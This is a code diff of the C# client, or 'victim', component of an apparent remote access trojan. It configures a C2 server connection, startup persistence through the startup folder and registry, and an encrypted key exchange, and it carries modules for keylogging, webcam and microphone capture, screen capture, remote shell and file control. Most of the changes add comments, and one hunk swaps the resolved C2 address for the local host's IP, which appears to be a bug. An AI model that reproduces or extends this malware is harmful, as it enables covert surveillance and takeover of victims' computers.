@@ -169,18 +169,19 @@ namespace winClient48
         #region Configuration
 
         //SOCKET CONNECTION
-        private string ip = "[IP]";
-        private int port = int.Parse("[PORT]"); //5000;
-        private int time_reconnect = int.Parse("[RETRY]"); //1000; //ms
+        private string ip = "[IP]";                          //C2 Server
+        private int port = int.Parse("[PORT]");              //Port
+        private int time_reconnect = int.Parse("[RETRY]");   //1000; //ms
         private int time_sendinfo = int.Parse("[INTERVAL]"); //1000; //ms
-        private int dwTimeout = int.Parse("[TIMEOUT]"); //100000; //ms
-        private bool send_screen = true;
-        private string id_prefix = "[PREFIX]";
-        private string id_hardware = string.Empty;
+        private int dwTimeout = int.Parse("[TIMEOUT]");      //100000; //ms
+        private bool send_screen = true;                     //Capture screen
+        private string id_prefix = "[PREFIX]";               //Client prefix
+        private string id_hardware = string.Empty;           //Hardware ID
 
-        private clsVictim.enProtocol m_protocol = (clsVictim.enProtocol)Enum.Parse(typeof(clsVictim.enProtocol), "[PROTOCOL]");
+        private clsVictim.enProtocol m_protocol =            //C2 Protocol
+            (clsVictim.enProtocol)Enum.Parse(typeof(clsVictim.enProtocol), "[PROTOCOL]");
 
-        private ClientConfig clntConfig;
+        private ClientConfig clntConfig;                     //Client configuration
 
         //PAYLOAD
         private string file_copy;
@@ -188,12 +189,12 @@ namespace winClient48
         private bool anti_process = false;
 
         //Install
-        private bool m_bCopyDir = bool.Parse("[IS_CP_DIR]");
-        private string m_szCopyDir = "[IS_SZ_DIR]"; //Dir name (path or path variable)
-        private bool m_bCopyStartUp = bool.Parse("[IS_CP_STARTUP]");
-        private string m_szCopyStartUp = "[IS_SZ_STARTUP]"; //Filename
-        private bool m_bReg = bool.Parse("[IS_REG]");
-        private string m_szRegKeyName = "[IS_REG_KEY]"; //Registry key name
+        private bool m_bCopyDir = bool.Parse("[IS_CP_DIR]");         //Copy to destination directory.
+        private string m_szCopyDir = "[IS_SZ_DIR]";                  //Dir name (path or path variable)
+        private bool m_bCopyStartUp = bool.Parse("[IS_CP_STARTUP]"); //Copy to startup.
+        private string m_szCopyStartUp = "[IS_SZ_STARTUP]";          //Filename
+        private bool m_bReg = bool.Parse("[IS_REG]");                //Registry startup.
+        private string m_szRegKeyName = "[IS_REG_KEY]";              //Registry key name
 
         //Misc
         private string m_szKeylogFileName = "[KL_FILE]";
@@ -222,25 +223,25 @@ namespace winClient48
         private int m_nDesktopDelay = 100;
 
         //MANAGER
-        private FuncInfo.PC funcInfoPC;
-        private FuncInfo.Client funcInfoClient;
-        private AntiProcess funcAntiProcess;
-        private FuncFile funcFile;
-        private FuncTask funcTask;
-        private FuncReg funcReg;
-        private FuncConn funcConn;
-        private FuncWindow funcWindow;
-        static KeyLogger keylogger;
-        private Keyboard keyboard;
-        private FuncMouse funcMouse;
-        private RemoteShell funcShell;
-        private MicAudio funcMicAudio;
-        private AudioPlayer funcAudioPlayer;
-        private FuncSystem funcSystem;
-        private FuncServ funcServ;
-        private FuncRunScript funcRunScript;
-        private FuncFun funcFun;
-        private Installer installer;
+        private FuncInfo.PC funcInfoPC;         //PC's information.
+        private FuncInfo.Client funcInfoClient; //Client's information.
+        private AntiProcess funcAntiProcess;    //Anti-Process.
+        private FuncFile funcFile;              //File manager.
+        private FuncTask funcTask;              //Task manager.
+        private FuncReg funcReg;                //Registry editor.
+        private FuncConn funcConn;              //Network connection.
+        private FuncWindow funcWindow;          //Window manager.
+        static KeyLogger keylogger;             //keylogger.
+        private Keyboard keyboard;              //keyboard.
+        private FuncMouse funcMouse;            //Mouse controller.
+        private RemoteShell funcShell;          //Remote shell.
+        private MicAudio funcMicAudio;          //Audio, microphone.
+        private AudioPlayer funcAudioPlayer;    //Audio.
+        private FuncSystem funcSystem;          //System.
+        private FuncServ funcServ;              //Service.
+        private FuncRunScript funcRunScript;    //Run customized script.
+        private FuncFun funcFun;                //Funny.
+        private Installer installer;            //Installer
 
         //WEBCAM
         static Webcam webcam;
@@ -302,20 +303,21 @@ namespace winClient48
             return Marshal.PtrToStructure<T>(ptr);
         }
 
-        /// <summary>
-        /// Process all data from server.
-        /// </summary>
-        /// <param name="v"></param>
+        #region Validation
+
         void Received(clsVictim v)
         {
             try
             {
+                //Variable definition.
                 Socket socket = v.socket;
                 clsDSP dsp = null;
                 int recv_len = 0;
                 byte[] static_recvBuf = new byte[clsVictim.MAX_BUFFER_LENGTH];
                 byte[] dynamic_recvBuf = new byte[] { };
-                v.Send(1, 0, "Hello");
+
+                v.Send(1, 0, "Hello"); //Knock.
+
                 do
                 {
                     static_recvBuf = new byte[clsVictim.MAX_BUFFER_LENGTH];
@@ -349,15 +351,24 @@ namespace winClient48
                             {
                                 if (dsp.Param == 0) //RECEIVED RSA KEY SEND ENCRYPTED AES KEY
                                 {
-                                    string rsa_publicKey = clsCrypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
-                                    rsa_publicKey = clsCrypto.b64D2Str(rsa_publicKey);
-                                    v.key_pairs.public_key = rsa_publicKey;
-                                    var aes = clsCrypto.AES_GenerateKeyAndIV();
-                                    v._AES.key = Convert.FromBase64String(aes.key);
-                                    v._AES.iv = Convert.FromBase64String(aes.iv);
-                                    string payload = aes.key + "|" + aes.iv;
-                                    byte[] enc_payload = clsCrypto.RSAEncrypt(payload, rsa_publicKey);
-                                    v.Send(1, 1, enc_payload);
+                                    string szRsaPublicKeyXml = clsCrypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
+                                    szRsaPublicKeyXml = clsCrypto.b64D2Str(szRsaPublicKeyXml); //Base64 decoding.
+
+                                    v.key_pairs.public_key = szRsaPublicKeyXml; //Store RSA public key into victim object.
+
+                                    var objAes = clsCrypto.AES_GenerateKeyAndIV(); //Generate new AES key and IV (initial vector).
+
+                                    byte[] abAesKey = Convert.FromBase64String(objAes.key); //AES key.
+                                    byte[] abAesIv = Convert.FromBase64String(objAes.iv); //AES IV.
+
+                                    v._AES.key = abAesKey;
+                                    v._AES.iv = abAesIv;
+
+                                    string szPayload = objAes.key + "|" + objAes.iv;
+
+                                    byte[] abEncPayload = clsCrypto.RSAEncrypt(szPayload, szRsaPublicKeyXml);
+
+                                    v.Send(1, 1, abEncPayload);
                                 }
                                 else if (dsp.Param == 2) //CHALLENGE AND RESPONSE
                                 {
@@ -367,6 +378,7 @@ namespace winClient48
                                     payload = clsCrypto.AESDecrypt(buffer, v._AES.key, v._AES.iv);
                                     payload = Convert.ToBase64String(clsCrypto.RSAEncrypt(payload, v.key_pairs.public_key));
                                     payload = clsCrypto.AESEncrypt(payload, v._AES.key, v._AES.iv);
+
                                     v.Send(1, 3, payload);
                                 }
                                 else if (dsp.Param == 4)
@@ -578,6 +590,7 @@ namespace winClient48
             }
         }
 
+        #endregion
 
         /// <summary>
         /// Process function data from server.
@@ -677,6 +690,7 @@ namespace winClient48
                                 $"Hostname: {info.szDnsHostName}\n" +
                                 $"StartUp: {info.szStartupPath}\n" +
                                 $"OS: {info.szOS}\n" +
+                                $"C2 Protocol: {Enum.GetName(typeof(clsVictim.enProtocol), m_protocol)}\n" +
                                 $"\n" +
                                 $"[User]\n" +
                                 $"Monitor[{info.ls_Monitor.Count}]: [{string.Join(", ", info.ls_Monitor)}]\n" +
@@ -2804,7 +2818,14 @@ namespace winClient48
                     {
                         IPAddress[] aAddr = Dns.GetHostAddresses(ip);
                         if (aAddr.Length > 0)
-                            ip = aAddr[0].ToString();
+                        {
+                            string hostName = Dns.GetHostName();
+                            IPAddress[] ips = Dns.GetHostAddresses(hostName);
+
+                            IPAddress firstIPv4 = ips.First(ip => ip.AddressFamily == AddressFamily.InterNetwork);
+
+                            ip = firstIPv4.ToString();
+                        }
                     }
                     catch
                     {
